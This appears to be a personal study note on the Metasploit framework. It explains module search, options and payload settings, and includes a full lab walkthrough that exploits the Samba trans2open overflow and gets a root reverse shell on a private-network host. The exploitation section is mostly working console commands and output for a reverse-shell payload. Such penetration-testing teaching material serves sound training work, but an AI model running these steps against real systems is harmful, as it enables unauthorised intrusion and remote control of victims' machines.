### Quick Start

#### Gaining root


**Commands**:
- From terminal: `msfconsole` - enter Metasploit framework CLI on installed systems
- `search keyword` - searches tooling for keyword, such as `smb`. See [[Metasploit#Search Command output example|this search example]] for more information.
- `use auxiliary/scanner/smb/smb_version` - Uses the module found at the name `auxiliary/scanner/smb/smb_version`, dropping the user into an interface for the module, which is denoted by the prompt `msf auxiliary(scanner/smb/smb_version) > â–ˆ`
    - *While within the prompt*:
        - `info` - will give you information on the module's use, and `options` will quickly display options
        - `set [optionName | payloadName] input` - set an option variable or payload -
            - **notes**: 
                - optionname is not case sensitive, e.g. `set RHOSTS` === `set rhosts`
                - can tab to autocomplete option or payload, and double tab to show available
        - `run` - execute the module
- See [[Metasploit#Search Command output example|this for an command output example of search and use]].
- See [[#Full exploitation example|this for an example of a successful exploitation]].


## General

**Overview**: Metasploit is an open-source exploitation framework developed by *Rapid7* for penetration testing. It is capable of identifying, exploiting, and validating vulnerabilities, as well as developing exploits and payloads. It includes a vast library of exploits, payloads, and other associated tools for performing attacks on software products, and evading detection.

## Reference

### Example Outputs:

#### Search Command output example:

```shell
msf > search smb

Matching Modules                                                                                                                                                                                                  
================                                                                                                                                                                                                  

   #    Name                                                                            Disclosure Date  Rank       Check  Description                                                                            
   -    ----                                                                            ---------------  ----       -----  -----------                                                                            
   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution                           
   1      \_ target: Java                                                               .                .          .      .
   2      \_ target: Linux                                                              .                .          .      .
   3      \_ target: Windows                                                            .                .          .      .
   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .
   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .
   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .
   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB
   9    post/linux/busybox/smb_share_root                                               .                normal     No     BusyBox SMB Sharing

```

**Search command output anatomy:**
Table lists matching Metasploit tools/*modules*.
- *Table columns, in order*: 
    - `#` - Result number
    - `Name` - Name of result - *Format* type_of_tool(e.g. *exploit*)/type_of_action(e.g. *dos*, or *fuzzing*)/target_service_class/target_service_name
    - `Disclosure Data` - date exploit was publicly disclosed
    - `Rank` - modules confidence/severity - e.g. *manual*, *normal*, *excellent*
    - `Check` - Whether module provides a safe (read: pre-exploit) check to test for the vuln without performing the exploit
    - `Description` - Short, human-readable summary
- **Note**: Module names may include sub-results if the target has variants or sub-types (e.g. different platforms, or different configurations)

#### Use, Options, and Info Command output example:

```shell

msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > 
msf auxiliary(scanner/smb/smb_version) > info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT                     no        The target port (TCP)
  THREADS  1                yes       The number of concurrent threads (max one per host)

Description:
  Fingerprint and display version information about SMB servers. Protocol
  information and host operating system (if available) will be reported.
  Host operating system detection requires the remote server to support
  version 1 of the SMB protocol. Compression and encryption capability
  negotiation is only present in version 3.1.1.


View the full module info with the info -d command.
msf auxiliary(scanner/smb/smb_version) >
msf auxiliary(scanner/smb/smb_version) >
msf auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf auxiliary(scanner/smb/smb_version) > set rhosts 192.168.109.129
rhosts => 192.168.109.129
msf auxiliary(scanner/smb/smb_version) > 
```

#### Full exploitation example

##### Unsuccessful attempt:

```bash
msf > search trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                                                                                                

msf > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set rhosts 192.168.109.129
rhosts => 192.168.109.129
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Samba 2.2.x - Bruteforce
```

###### This is what failure looks like

```bash
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 3 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1062760 bytes) to 192.168.109.129
[*] 192.168.109.129 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff5fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff4fc...
^C[-] 192.168.109.129:139 - Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf exploit(linux/samba/trans2open) > 
[-] Meterpreter session 1 is not valid and will be closed
[-] Meterpreter session 2 is not valid and will be closed
[-] Meterpreter session 3 is not valid and will be closed
[-] Meterpreter session 4 is not valid and will be closed
options
```

##### Switching payload -> box rooted

```bash
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > set payload linux/x86/
set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
set payload linux/x86/read_file                       
msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                      s/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


```

###### This is what success looks like

```
View the full module info with the info, or info -d command.

msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 192.168.109.128:4444 
[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.109.128:4444 -> 192.168.109.129:32773) at 2025-10-11 18:02:08 -0400

[*] Command shell session 6 opened (192.168.109.128:4444 -> 192.168.109.129:32774) at 2025-10-11 18:02:09 -0400
wh[*] Command shell session 7 opened (192.168.109.128:4444 -> 192.168.109.129:32775) at 2025-10-11 18:02:11 -0400
oami[*] Command shell session 8 opened (192.168.109.128:4444 -> 192.168.109.129:32776) at 2025-10-11 18:02:12 -0400
whoami 
//bin/sh: whowhoami: command not found
whoami
root

```

### Glossary

**Tool Categories**:
- *Exploits* - Leverages vulns on target service or software product to gain unintentional access to data or permissions.
- *Auxiliary* - Scans and enumerates services or products for vulnerabilities
- *Post* - Provides privilege escalation and pivoting capabilities
- *Payloads* - 
- *Encoders* - 
- *NOPs* - 
- *Evasion* - 